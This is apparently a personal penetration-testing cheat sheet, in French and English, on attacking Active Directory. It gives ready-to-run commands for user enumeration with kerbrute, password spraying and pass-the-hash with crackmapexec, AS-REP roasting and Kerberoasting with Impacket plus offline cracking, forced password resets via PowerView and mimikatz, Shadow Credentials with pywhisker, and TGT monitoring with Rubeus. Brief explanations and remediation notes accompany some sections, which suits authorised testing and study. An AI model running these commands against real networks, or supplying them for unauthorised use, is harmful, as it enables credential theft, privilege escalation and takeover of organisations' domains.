*Sources :  https://beta.hackndo.com/ ; https://notes.qazeer.io/*
  
# Enumeration
## DC Enumeration
***Find the Domain Controllers of a domain:***   
`PS> nltest /dclist:<domain>`   
The DC is often the DNS server except for specific cases, can be found with dig, ifconfig, ipconfig, etc.    

## User Enumeration 
***User enumeration through Kerberos port 88:***  
`./kerbrute_linux_amd64 userenum --dc 10.10.11.152 -d <domain> /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt`
  
 ***Browse through Active Directory:***   
 `ADExplorer.exe` with Sysinternals installed (not flagged because it is a Microsoft-signed tool)    
 `C:> rundll32 dsquery,OpenQueryWindow`  

## Password spraying (Use/Re-use credentials)  
`crackmapexec winrm 192.168.110.52-56 -u "Administrator" -p "P@ssw0rd"`  
`crackmapexec smb 192.168.110.52-56 -u 'Administrator' -p 'PASSWORD' --local-auth`  
 <br>
 Reuse found hashes on the network :   
   
`crackmapexec smb 192.168.110.52-56 -u administrator -H 'LMHASH:NTHASH' --local-auth`  
`crackmapexec smb 192.168.110.0/24 -u administrator -H 'NTHASH'`  
 <br>
# AS_REP Roasting - Not authenticated      
  
https://beta.hackndo.com/kerberos-asrep-roasting/
  
  
## Outils :  
·       Rubeus
·       Impacket : GetNPUsers.py
  
## Explication :  
Lors d’une demande de TGT, l’utilisateur doit, par défaut, s’authentifier auprès du KDC pour que celui-ci lui réponde. Il arrive que cette authentification préalable ne soit pas demandée pour certains comptes, permettant à un attaquant d’abuser de cette configuration.
Lorsque nous avons parlé du fonctionnement de Kerberos, il a été mis en évidence que dans le premier échange (KRB_AS_REQ - KRB_AS_REP), le client doit d’abord s’authentifier auprès du KDC avant d’obtenir un TGT. Une partie de la réponse du KDC étant chiffrée avec le secret du compte client (la clé de session), il est important que cette information ne soit pas accessible sans authentification. Dans le cas échéant n’importe qui pourrait demander un TGT pour un compte donné, et tenter de décrypter la partie chiffrée de la réponse KRB_AS_REP pour retrouver le mot de passe de l’utilisateur ciblé.
  

TODO IMG


## Remédiation :  
Ne pas activer “Do not require Kerberos preauthentication”
  
  
À partir de l’adresse <https://beta.hackndo.com/kerberos-asrep-roasting/>
  
## Exécution  
***Récupération des TGT pour les utilisateurs pour lesquels la preauth Kerberos est désactivée :***  
<br>
`PS > python C:\GetNPUsers.py spookysec.local/ -no-pass -usersfile .\userlist2.txt -dc-ip <dc_ip> -outputfile .\ASREP_Roastable_users.txt`
  
***Puis cracking :***  
`PS> john --wordlist=$wordlist ASREP_Roastable_users.txt`
  
(ou : `PS >  .\hashcat.exe --force -m 18200 -a 0 -o "../hash_res.txt" "../svc-admin.txt"`)
  

# Kerberoasting - Authenticated  

## Outils :  
- ListusersSPNs.ps1  
- Impacket GetUserSPNs.py  
  
## Explications :  
Les comptes de service ont un SPN (Service Principal Name), exemple : www/WEB-SERVER-01.adsec.local  
SPN = combinaison du service + de la machine hébergeant le service 
Pour un utilisateur authentifié et en possesion d'un TGT, il est possible de demander un TGS pour n'importe quel service auprès du KDC. Ce TGS sera chiffré avec le mot de passe du compte possédant le SPN. Les comptes de service ont généralement un mdp robuste (20-30 caractères), cependant il arrive que certains comptes utilisateur ou comptes de service au mot de passe faible possèdent un SPN, il est donc possible pour un utilisateur authentifié et en possesion d'un TGT de requêter un TGS en indiquant ce SPN et de casser le mot de passe du TGS fourni.    
L'attaque se base également sur le fait qu'une partie des tickets de service est chiffrée en utilisant l'un des secrets du compte de service et que le type de chiffrement à utiliser peut être spécifié côté client afin de forcer l'utilisation de la clé RC4. Ainsi, une attaque de cassage hors ligne sur les tickets de service peut être menée pour récupérer le mot de passe en clair du compte de service correspondant.
    
## Remédiation :  
Pas de SPN sur les comptes utilisateurs (ces derniers ont souvent des comptes à mot de passe suivant la politique AD pouvant être bruteforcés), ou alors si VRAIMENT nécessaire, utiliser la fonctionnalité “Managed Service Accounts” (MSA) de Microsoft qui permet de faire en sorte que le mot de passe du compte soit robuste et changé régulièrement et automatiquement  
  
## Exécution  
`ListusersSPNs.ps1`, listing des utilisateurs possédant un SPN :  

`$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")`  
`$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"`     
`$results = $search.Findall()`    
`foreach($result in $results)`    
 &nbsp;&nbsp;&nbsp;`{`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`$userEntry = $result.GetDirectoryEntry()`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`Write-host "User : " $userEntry.name "(" $userEntry.distinguishedName ")"`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`Write-host "SPNs"`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`foreach($SPN in $userEntry.servicePrincipalName)`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`{`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`$SPN`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`}`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`Write-host ""`  
 &nbsp;&nbsp;&nbsp;`}`      
       
  
À partir de l’adresse <https://beta.hackndo.com/kerberoasting/>
  
  
***Récupération des TGS :***  
<br> 
`C:\Users\Leperche\Desktop\no_scan\impacket-master\examples>python GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<domain_username>`  
  
`impacket-GetUserSPNs -target-domain domain.htb -outputfile kerberoastables.txt -dc-ip 192.168.110.50 -request domain.htb/michael`  
  
***Cracking des TGS :***    
  
`
john --format=krb5tgs --wordlist=/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt TGS_to_crack.txt
`
  
***Affichage des TGS crackés :***  
  
`cat ~/.john/john.pot`
  
# DCSync  
TODO
      
# DCShadow  
TODO  
   
   
# Rights abuse 
## ForceChangePassword abuse
  
```
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'johnfromthegarden' -AccountPassword $NewPassword
```
```  
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::setntlm /user:TargetUser /password:bahouaismorray /server:10.10.110.75" "exit"
```  
    
## Shadow Credentials    
The Kerberos authentication protocol works with tickets in order to grant access. An ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to ASREProast). The pre-authentication can be validated symmetrically (with a DES, RC4, AES128 or AES256 key) or asymmetrically (with certificates). The asymmetrical way of pre-authenticating is called PKINIT.  
Active Directory user and computer objects have an attribute called `msDS-KeyCredentialLink` where raw public keys can be set. When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.
The ability to edit the `msDS-KeyCredentialLink` (a.k.a. "kcl") attribute of other objects (e.g. member of a special group, etc.) can allows attackers to create a key pair, append to raw public key in the attribute, and obtain persistent and stealthy access to the target object (can be a user or a computer).  
*(From https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)*   
  
### Exploitation   
  
Use `pywhisker` : https://github.com/ShutdownRepo/pyWhisker 
  
List certificates :    
```
python3 pywhisker.py -d "test.local" -u "johnfromthegarden" -p '!Habile123' --target "SVRMGMT1$" --action "list"
```
  
Get info on the listed certificates :   
```
python3 pywhisker.py -d "test.local" -u "johnfromthegarden" -p '!Habile123' --target "SVRMGMT1$" --action "info" --device-id 6419739b-ff90-f5c7-0737-1331daeb7db6
```
  
Add a new certificate and save it to "test1" :  
```
python3 pywhisker.py -d "test.local" -u "johnfromthegarden" -p '!Habile123' --target "SVRMGMT1$" --action "add" --filename test1
```
  
It is also possible to use `Whisker.exe` :  
```
Whisker.exe add /target:WRKST1$
```
    
      
# Post Exploitation  
## Domain/forest trust abuse   
TODO  
  
## Monitoring TGTs  
It is possible to monitor for TGT once on the DC:  
`.\Rubeus.exe monitor /nowrap /interval:2`  
  
Use the `/filteruser:TARGET_DC$` option in order to target specific TGTs  
